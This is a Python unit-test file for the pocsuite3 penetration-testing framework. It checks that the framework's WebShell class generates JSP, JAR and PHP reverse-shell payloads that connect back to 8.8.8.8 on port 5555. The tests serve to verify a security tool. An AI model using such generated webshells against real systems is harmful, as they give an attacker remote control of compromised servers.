import unittest
import os
from pocsuite3.api import WebShell
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.enums import SHELLCODE_TYPE


class TestCase(unittest.TestCase):
    def setUp(self):
        self.shellpath = os.path.join(paths.POCSUITE_TMP_PATH, "payload.jar")

    def tearDown(self):
        if os.path.exists(self.shellpath):
            os.unlink(self.shellpath)

    def test_gen_jsp_shell(self):
        ip = "8.8.8.8"
        ws = WebShell(connect_back_ip=ip, connect_back_port=5555)
        shellcode, _ = ws.create_shellcode(shell_type=SHELLCODE_TYPE.JSP, inline=True)
        self.assertTrue(ip in shellcode)

    def test_gen_jar_shell(self):
        ip = "8.8.8.8"
        ws = WebShell(connect_back_ip=ip, connect_back_port=5555)
        _, shell = ws.create_shellcode(shell_type=SHELLCODE_TYPE.JAR)
        self.assertTrue(shell.path_to_jar != "")

    def test_gen_php_shell(self):
        ip = "8.8.8.8"
        ws = WebShell(connect_back_ip=ip, connect_back_port=5555)
        shellcode, _ = ws.create_shellcode(shell_type=SHELLCODE_TYPE.PHP, inline=True)
        self.assertTrue(ip in shellcode and shellcode.startswith('<?php'))
